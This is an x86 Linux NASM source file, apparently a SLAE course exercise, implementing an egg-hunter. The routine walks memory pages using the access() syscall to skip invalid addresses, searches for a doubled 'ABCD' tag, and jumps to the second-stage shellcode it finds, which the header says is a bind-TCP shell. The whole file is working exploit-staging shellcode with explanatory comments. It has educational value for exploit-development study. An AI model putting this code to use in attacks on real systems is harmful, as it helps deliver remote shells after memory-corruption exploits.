; Filename: EggHunter.nasm
; Author:  SLAE-935
;
; Purpose: execute through egg-hunter routine the shellcode of ShellBindTcp

global _start			

section .text

_start:
    ; EDX = ptr address to be validated against access call and later egg
    xor edx, edx

next_page:
    ; Page alignment branch, if a EFAULT is returned from system call all the addresses
    ; in the current page are to be considered invalid, so the page is incremented,
    ; This operation is equivalent to adding 0x1000 to the value in edx
    or dx, 0xfff

next_address:

    ; access(const char *pathname, int mode)
    ; EAX = 33 = system call nbr
    ; EBX = ptr to address to be validated (egg being searched)
    ; ECX = 0 (not used in call)
    ; EDX = current ptr to in page address to be validated (not used in call)

    inc edx ; increments of 1 byte

    ; EBX = ptr to next 8 bytes (this way it allows to examine 8 bytes in a row)
    lea ebx, [edx+0x4]

    xor eax, eax ; initialize eax
    mov al, 33 ; to system call value
    int 0x80
    ; EAX = access return value (0 success, -1 error -> EFAULT)
 
    cmp al, 0xf2 ; check for EFAULT
    je next_page ; if yes, keep searching in next page
                 ; if not search egg in current memory space
    
    ; scasd
    ; EAX = DWORD first comparison operand = ABCD
    ; EDI = DWORD second operand
    mov eax, 0x41424344 ; egg tag ABCD
    mov edi, edx ; ptr to first 4 bytes
    scasd
    ; ret = set status flag, moves edi + 4 bytes

    jne next_address ; if not equal check current address + 1
                     ; if equal we check for second part of the tag

    ; scasd
    ; EAX = DWORD first comparison operand = ABCD
    ; EDI = DWORD second operand
    scasd
    ; ret = set status flag, moves edi + 4 bytes

    jne next_address ; if not equal check current address + 1
                     ; if equal we have found the egg, and jump to edi which now points
                     ; at the beginning of 2nd stage shellcode

    jmp edi ; actually edi points to the beginning of shellcode
